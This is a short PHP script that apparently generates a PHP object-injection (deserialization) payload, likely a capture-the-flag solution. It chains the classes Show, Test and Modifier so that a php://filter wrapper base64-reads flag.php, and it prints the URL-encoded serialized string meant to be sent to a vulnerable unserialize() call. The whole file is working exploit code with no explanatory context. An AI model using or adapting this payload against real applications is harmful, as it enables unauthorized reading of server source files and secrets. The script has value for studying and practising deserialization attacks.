<?php
class Modifier {
    protected  $var = 'php://filter/read=convert.base64-encode/resource=flag.php';
}
class Show
{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
    }
    public function __toString(){
        return "aaa";
    }

}
class Test{
    public $p;
}
$a = new Show("index.php");
$b = new Test();
$c = new Modifier();
$b->p = $c;
$a->str = $b;
$d = new Show($a);
echo urlencode(serialize($d));